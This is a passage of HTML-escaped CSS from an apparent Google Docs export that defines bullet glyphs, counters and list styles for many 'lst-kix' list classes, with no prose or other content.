&quot;}.lst-kix_d2sey3cqswhj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d2sey3cqswhj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_iwbl6bi5grxz-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ac166bpppqid-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vwtmwxmruch-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vwtmwxmruch-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vwtmwxmruch-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ac166bpppqid-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_psxevvsc6jj-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yglvxt1mgfm7-8&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-8}.lst-kix_psxevvsc6jj-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d2sey3cqswhj-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_vwtmwxmruch-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vwtmwxmruch-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_psxevvsc6jj-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_h3wwlbtif53z-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_psxevvsc6jj-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_h3wwlbtif53z-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_y0pkx69mb2m-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d2x9ez3q88fg-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_6jkbamo228jj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_y0pkx69mb2m-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_y0pkx69mb2m-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-3.start{counter-reset:lst-ctn-kix_t96lsgedizsa-3 0}.lst-kix_d2x9ez3q88fg-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_exm17v4ppgu6-2&gt;li{counter-increment:lst-ctn-kix_exm17v4ppgu6-2}ol.lst-kix_4ibbyvy1vtvo-7{list-style-type:none}ol.lst-kix_4ibbyvy1vtvo-6{list-style-type:none}ol.lst-kix_4ibbyvy1vtvo-8{list-style-type:none}.lst-kix_6jkbamo228jj-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s0pfb3xl5agk-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_6jkbamo228jj-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s0pfb3xl5agk-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_6jkbamo228jj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s0pfb3xl5agk-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_y0pkx69mb2m-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_d2x9ez3q88fg-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d2x9ez3q88fg-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fr1tg9t3fnuc-3&gt;li{counter-increment:lst-ctn-kix_fr1tg9t3fnuc-3}.lst-kix_617gqi1nmysw-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_617gqi1nmysw-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dfz1k4s8ecbk-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dfz1k4s8ecbk-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_8nqiqtogbohm-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_617gqi1nmysw-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_exm17v4ppgu6-3&gt;li{counter-increment:lst-ctn-kix_exm17v4ppgu6-3}.lst-kix_617gqi1nmysw-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_8nqiqtogbohm-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_dfz1k4s8ecbk-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_yglvxt1mgfm7-1.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-1 0}.lst-kix_8nqiqtogbohm-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_8nqiqtogbohm-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_617gqi1nmysw-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_igrdcirknl8n-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t96lsgedizsa-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-7,lower-latin) &quot;. &quot;}ul.lst-kix_3g8lw71b2h2n-8{list-style-type:none}.lst-kix_igrdcirknl8n-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_igrdcirknl8n-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_3g8lw71b2h2n-6{list-style-type:none}ul.lst-kix_3g8lw71b2h2n-7{list-style-type:none}.lst-kix_t96lsgedizsa-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-8,lower-roman) &quot;. &quot;}.lst-kix_8nqiqtogbohm-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_igrdcirknl8n-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_3g8lw71b2h2n-4{list-style-type:none}.lst-kix_igrdcirknl8n-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_3g8lw71b2h2n-5{list-style-type:none}ul.lst-kix_3g8lw71b2h2n-2{list-style-type:none}ul.lst-kix_3g8lw71b2h2n-3{list-style-type:none}ul.lst-kix_3g8lw71b2h2n-0{list-style-type:none}.lst-kix_c9xp0vh8wziq-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_3g8lw71b2h2n-1{list-style-type:none}.lst-kix_dfz1k4s8ecbk-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d2sey3cqswhj-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_c9xp0vh8wziq-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ac166bpppqid-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ac166bpppqid-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_c9xp0vh8wziq-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bkiq3d71krcq-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_3jqgp1gp6n0e-3{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-4{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-1{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-2{list-style-type:none}ul.lst-kix_igrdcirknl8n-6{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-0{list-style-type:none}ul.lst-kix_igrdcirknl8n-7{list-style-type:none}.lst-kix_c9xp0vh8wziq-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ac166bpppqid-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_igrdcirknl8n-8{list-style-type:none}.lst-kix_xrub3d64di6y-6&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-6}ul.lst-kix_s0pfb3xl5agk-0{list-style-type:none}.lst-kix_iwbl6bi5grxz-8&gt;li{counter-increment:lst-ctn-kix_iwbl6bi5grxz-8}ul.lst-kix_igrdcirknl8n-2{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-1{list-style-type:none}ul.lst-kix_igrdcirknl8n-3{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-2{list-style-type:none}ul.lst-kix_igrdcirknl8n-4{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-3{list-style-type:none}ul.lst-kix_igrdcirknl8n-5{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-4{list-style-type:none}.lst-kix_t96lsgedizsa-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-3,decimal) &quot;. &quot;}ul.lst-kix_3jqgp1gp6n0e-7{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-5{list-style-type:none}.lst-kix_ujr7qqe1p9gc-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_3jqgp1gp6n0e-8{list-style-type:none}.lst-kix_c9xp0vh8wziq-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_s0pfb3xl5agk-6{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-5{list-style-type:none}ul.lst-kix_igrdcirknl8n-0{list-style-type:none}ol.lst-kix_yglvxt1mgfm7-6.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-6 0}ul.lst-kix_s0pfb3xl5agk-7{list-style-type:none}ul.lst-kix_3jqgp1gp6n0e-6{list-style-type:none}ul.lst-kix_igrdcirknl8n-1{list-style-type:none}ul.lst-kix_s0pfb3xl5agk-8{list-style-type:none}.lst-kix_t96lsgedizsa-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-4,lower-latin) &quot;. &quot;}.lst-kix_ujr7qqe1p9gc-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t96lsgedizsa-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-0,decimal) &quot;. &quot;}.lst-kix_bkiq3d71krcq-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_bkiq3d71krcq-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yglvxt1mgfm7-7.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-7 0}ol.lst-kix_fr1tg9t3fnuc-4.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-4 0}.lst-kix_bkiq3d71krcq-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_bkiq3d71krcq-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_qaar1kuwufoe-0{list-style-type:none}.lst-kix_fr1tg9t3fnuc-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-1,lower-latin) &quot;. &quot;}ul.lst-kix_qaar1kuwufoe-4{list-style-type:none}ul.lst-kix_qaar1kuwufoe-3{list-style-type:none}.lst-kix_d8jkcmfkq4n7-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_qaar1kuwufoe-2{list-style-type:none}ul.lst-kix_qaar1kuwufoe-1{list-style-type:none}ul.lst-kix_qaar1kuwufoe-8{list-style-type:none}ul.lst-kix_qaar1kuwufoe-7{list-style-type:none}ul.lst-kix_qaar1kuwufoe-6{list-style-type:none}ul.lst-kix_qaar1kuwufoe-5{list-style-type:none}.lst-kix_t96lsgedizsa-5&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-5}.lst-kix_q2cw7ye43y3y-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3jqgp1gp6n0e-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fr1tg9t3fnuc-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-5,lower-roman) &quot;. &quot;}.lst-kix_kf4qbiideq6a-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q2cw7ye43y3y-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_o7h24lqlh2ds-1{list-style-type:none}.lst-kix_iwbl6bi5grxz-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xrub3d64di6y-1&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-1}ul.lst-kix_g55j9m9u7d1p-5{list-style-type:none}ul.lst-kix_o7h24lqlh2ds-2{list-style-type:none}ul.lst-kix_g55j9m9u7d1p-4{list-style-type:none}.lst-kix_3jqgp1gp6n0e-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_o7h24lqlh2ds-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_g55j9m9u7d1p-3{list-style-type:none}ul.lst-kix_o7h24lqlh2ds-0{list-style-type:none}ul.lst-kix_g55j9m9u7d1p-2{list-style-type:none}.lst-kix_kf4qbiideq6a-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_g55j9m9u7d1p-8{list-style-type:none}ul.lst-kix_g55j9m9u7d1p-7{list-style-type:none}.lst-kix_q60yv0wr6jjb-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-1,lower-latin) &quot;. &quot;}ul.lst-kix_g55j9m9u7d1p-6{list-style-type:none}.lst-kix_iwbl6bi5grxz-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_iwbl6bi5grxz-5,lower-roman) &quot;. &quot;}ol.lst-kix_q60yv0wr6jjb-2.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-2 0}.lst-kix_o7h24lqlh2ds-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujr7qqe1p9gc-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-7.start{counter-reset:lst-ctn-kix_t96lsgedizsa-7 0}ol.lst-kix_exm17v4ppgu6-2.start{counter-reset:lst-ctn-kix_exm17v4ppgu6-2 0}ol.lst-kix_yglvxt1mgfm7-2.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-2 0}.lst-kix_h3wwlbtif53z-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d8jkcmfkq4n7-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t96lsgedizsa-3&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-3}.lst-kix_q60yv0wr6jjb-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-5,lower-roman) &quot;. &quot;}.lst-kix_d2sey3cqswhj-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ac166bpppqid-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q2cw7ye43y3y-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xis8r8r67pmi-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_u8gl45uj8k5w-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vwtmwxmruch-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_vwtmwxmruch-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_q60yv0wr6jjb-1.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-1 0}.lst-kix_6jkbamo228jj-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_psxevvsc6jj-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_exm17v4ppgu6-3.start{counter-reset:lst-ctn-kix_exm17v4ppgu6-3 0}ol.lst-kix_t96lsgedizsa-8.start{counter-reset:lst-ctn-kix_t96lsgedizsa-8 0}.lst-kix_d2sey3cqswhj-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_h3wwlbtif53z-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xis8r8r67pmi-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_u8gl45uj8k5w-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xynuzpm7g9iu-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_psxevvsc6jj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d2x9ez3q88fg-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_xynuzpm7g9iu-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_y0pkx69mb2m-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_y0pkx69mb2m-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_g55j9m9u7d1p-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_6jkbamo228jj-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s0pfb3xl5agk-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yglvxt1mgfm7-7{list-style-type:none}ol.lst-kix_yglvxt1mgfm7-6{list-style-type:none}ol.lst-kix_yglvxt1mgfm7-8{list-style-type:none}.lst-kix_d2x9ez3q88fg-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yglvxt1mgfm7-1{list-style-type:none}ol.lst-kix_yglvxt1mgfm7-0{list-style-type:none}.lst-kix_4ibbyvy1vtvo-5&gt;li{counter-increment:lst-ctn-kix_4ibbyvy1vtvo-5}ol.lst-kix_yglvxt1mgfm7-3{list-style-type:none}ol.lst-kix_yglvxt1mgfm7-2{list-style-type:none}.lst-kix_6jkbamo228jj-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yglvxt1mgfm7-5{list-style-type:none}.lst-kix_s0pfb3xl5agk-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xrub3d64di6y-8&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-8}ol.lst-kix_yglvxt1mgfm7-4{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-3.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-3 0}.lst-kix_mfml2x2u431k-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_mfml2x2u431k-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_mfml2x2u431k-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_mfml2x2u431k-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qg70u2ientmm-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_er11mo8sb81m-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qg70u2ientmm-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_g55j9m9u7d1p-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_er11mo8sb81m-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3g8lw71b2h2n-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3g8lw71b2h2n-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_g55j9m9u7d1p-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qg70u2ientmm-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_mfml2x2u431k-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_hgm0ng6gomha-8{list-style-type:none}ul.lst-kix_hgm0ng6gomha-6{list-style-type:none}ul.lst-kix_hgm0ng6gomha-7{list-style-type:none}ul.lst-kix_twe3knjlgokg-5{list-style-type:none}ul.lst-kix_hgm0ng6gomha-0{list-style-type:none}ul.lst-kix_twe3knjlgokg-6{list-style-type:none}ul.lst-kix_hgm0ng6gomha-1{list-style-type:none}ul.lst-kix_twe3knjlgokg-3{list-style-type:none}ul.lst-kix_twe3knjlgokg-4{list-style-type:none}ul.lst-kix_twe3knjlgokg-1{list-style-type:none}.lst-kix_3g8lw71b2h2n-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_hgm0ng6gomha-4{list-style-type:none}ul.lst-kix_twe3knjlgokg-2{list-style-type:none}ul.lst-kix_hgm0ng6gomha-5{list-style-type:none}ul.lst-kix_hgm0ng6gomha-2{list-style-type:none}ul.lst-kix_twe3knjlgokg-0{list-style-type:none}ul.lst-kix_hgm0ng6gomha-3{list-style-type:none}.lst-kix_7eqv8k2d3k5e-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_iwbl6bi5grxz-0.start{counter-reset:lst-ctn-kix_iwbl6bi5grxz-0 0}ol.lst-kix_xrub3d64di6y-8.start{counter-reset:lst-ctn-kix_xrub3d64di6y-8 0}.lst-kix_er11mo8sb81m-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_er11mo8sb81m-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7eqv8k2d3k5e-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_fr1tg9t3fnuc-2.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-2 0}ol.lst-kix_q60yv0wr6jjb-8.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-8 0}.lst-kix_er11mo8sb81m-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_7eqv8k2d3k5e-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7eqv8k2d3k5e-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_c9xp0vh8wziq-0{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-1{list-style-type:none}.lst-kix_7eqv8k2d3k5e-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_vk3kycj1zc1-3{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-8{list-style-type:none}ul.lst-kix_vk3kycj1zc1-4{list-style-type:none}ul.lst-kix_vk3kycj1zc1-5{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-6{list-style-type:none}ul.lst-kix_vk3kycj1zc1-6{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-7{list-style-type:none}.lst-kix_887mzeed6aeb-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_c9xp0vh8wziq-4{list-style-type:none}ul.lst-kix_vk3kycj1zc1-0{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-5{list-style-type:none}ul.lst-kix_twe3knjlgokg-7{list-style-type:none}ul.lst-kix_vk3kycj1zc1-1{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-2{list-style-type:none}ol.lst-kix_iwbl6bi5grxz-7.start{counter-reset:lst-ctn-kix_iwbl6bi5grxz-7 0}ul.lst-kix_twe3knjlgokg-8{list-style-type:none}ul.lst-kix_vk3kycj1zc1-2{list-style-type:none}ul.lst-kix_c9xp0vh8wziq-3{list-style-type:none}.lst-kix_887mzeed6aeb-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_xrub3d64di6y-1.start{counter-reset:lst-ctn-kix_xrub3d64di6y-1 0}ul.lst-kix_vk3kycj1zc1-7{list-style-type:none}ul.lst-kix_g55j9m9u7d1p-1{list-style-type:none}ul.lst-kix_vk3kycj1zc1-8{list-style-type:none}ul.lst-kix_g55j9m9u7d1p-0{list-style-type:none}.lst-kix_887mzeed6aeb-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3g8lw71b2h2n-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_3ebgtidubwl1-1{list-style-type:none}ul.lst-kix_3ebgtidubwl1-0{list-style-type:none}ul.lst-kix_3ebgtidubwl1-8{list-style-type:none}ul.lst-kix_3ebgtidubwl1-7{list-style-type:none}ul.lst-kix_3ebgtidubwl1-6{list-style-type:none}ul.lst-kix_3ebgtidubwl1-5{list-style-type:none}ul.lst-kix_3ebgtidubwl1-4{list-style-type:none}ul.lst-kix_3ebgtidubwl1-3{list-style-type:none}ul.lst-kix_3ebgtidubwl1-2{list-style-type:none}.lst-kix_qxy8bxc9ldy0-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_xrub3d64di6y-6.start{counter-reset:lst-ctn-kix_xrub3d64di6y-6 0}ol.lst-kix_t96lsgedizsa-2.start{counter-reset:lst-ctn-kix_t96lsgedizsa-2 0}ol.lst-kix_yglvxt1mgfm7-8.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-8 0}.lst-kix_yglvxt1mgfm7-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yglvxt1mgfm7-7,lower-latin) &quot;. &quot;}.lst-kix_3jqgp1gp6n0e-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qxy8bxc9ldy0-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_o7h24lqlh2ds-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_3jqgp1gp6n0e-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_o7h24lqlh2ds-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_887mzeed6aeb-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_9qmrelv5gsqt-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q60yv0wr6jjb-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-2,lower-roman) &quot;. &quot;}.lst-kix_wgc4so2hx3bb-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q60yv0wr6jjb-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-4,lower-latin) &quot;. &quot;}.lst-kix_3jqgp1gp6n0e-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yglvxt1mgfm7-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yglvxt1mgfm7-1,lower-latin) &quot;. &quot;}.lst-kix_1zxa3b55tidx-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-4.start{counter-reset:lst-ctn-kix_t96lsgedizsa-4 0}.lst-kix_u8gl45uj8k5w-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xis8r8r67pmi-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_rkrpvoovd3qp-2{list-style-type:none}.lst-kix_xis8r8r67pmi-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_rkrpvoovd3qp-3{list-style-type:none}ul.lst-kix_rkrpvoovd3qp-0{list-style-type:none}ul.lst-kix_rkrpvoovd3qp-1{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-5.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-5 0}ul.lst-kix_rkrpvoovd3qp-6{list-style-type:none}ul.lst-kix_rkrpvoovd3qp-7{list-style-type:none}.lst-kix_1zxa3b55tidx-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_rkrpvoovd3qp-4{list-style-type:none}ul.lst-kix_rkrpvoovd3qp-5{list-style-type:none}ul.lst-kix_rkrpvoovd3qp-8{list-style-type:none}ul.lst-kix_hwtgc2it419p-0{list-style-type:none}ul.lst-kix_hwtgc2it419p-2{list-style-type:none}ul.lst-kix_hwtgc2it419p-1{list-style-type:none}ul.lst-kix_hwtgc2it419p-4{list-style-type:none}ul.lst-kix_hwtgc2it419p-3{list-style-type:none}ul.lst-kix_hwtgc2it419p-6{list-style-type:none}.lst-kix_vk3kycj1zc1-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_hwtgc2it419p-5{list-style-type:none}ul.lst-kix_hwtgc2it419p-8{list-style-type:none}.lst-kix_t96lsgedizsa-7&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-7}ul.lst-kix_hwtgc2it419p-7{list-style-type:none}.lst-kix_9qmrelv5gsqt-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_u8gl45uj8k5w-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xynuzpm7g9iu-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_vk3kycj1zc1-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_xrub3d64di6y-3.start{counter-reset:lst-ctn-kix_xrub3d64di6y-3 0}ol.lst-kix_q60yv0wr6jjb-6.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-6 0}.lst-kix_xynuzpm7g9iu-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_iwbl6bi5grxz-5.start{counter-reset:lst-ctn-kix_iwbl6bi5grxz-5 0}ol.lst-kix_fr1tg9t3fnuc-7.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-7 0}.lst-kix_xrub3d64di6y-5&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-5}.lst-kix_g55j9m9u7d1p-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q60yv0wr6jjb-4&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-4}.lst-kix_kahfkmaienq0-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_mfml2x2u431k-8{list-style-type:none}ul.lst-kix_mfml2x2u431k-7{list-style-type:none}.lst-kix_617gqi1nmysw-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_dfz1k4s8ecbk-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_yqb7oqt8gv0c-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dfz1k4s8ecbk-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_ysdrt8wuz901-7{list-style-type:none}.lst-kix_hgm0ng6gomha-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w4u8mtfc6uha-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_ysdrt8wuz901-8{list-style-type:none}ul.lst-kix_ysdrt8wuz901-1{list-style-type:none}ul.lst-kix_ysdrt8wuz901-2{list-style-type:none}ul.lst-kix_ysdrt8wuz901-0{list-style-type:none}.lst-kix_617gqi1nmysw-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_ysdrt8wuz901-5{list-style-type:none}ul.lst-kix_ysdrt8wuz901-6{list-style-type:none}ul.lst-kix_ysdrt8wuz901-3{list-style-type:none}ul.lst-kix_ysdrt8wuz901-4{list-style-type:none}.lst-kix_8nqiqtogbohm-2&gt;li:before{content:&quot;\0025a0   